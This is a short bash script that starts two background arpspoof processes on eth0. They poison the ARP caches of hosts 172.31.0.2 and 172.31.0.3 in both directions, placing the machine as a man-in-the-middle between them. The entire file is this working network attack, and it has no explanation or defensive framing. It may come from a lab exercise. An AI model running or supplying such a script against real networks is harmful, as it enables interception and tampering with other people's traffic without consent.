#!/bin/bash

# Run the first arpspoof command in the background
sudo arpspoof -i eth0 -t 172.31.0.2 172.31.0.3 &

# Run the second arpspoof command in the background
sudo arpspoof -i eth0 -t 172.31.0.3 172.31.0.2 &

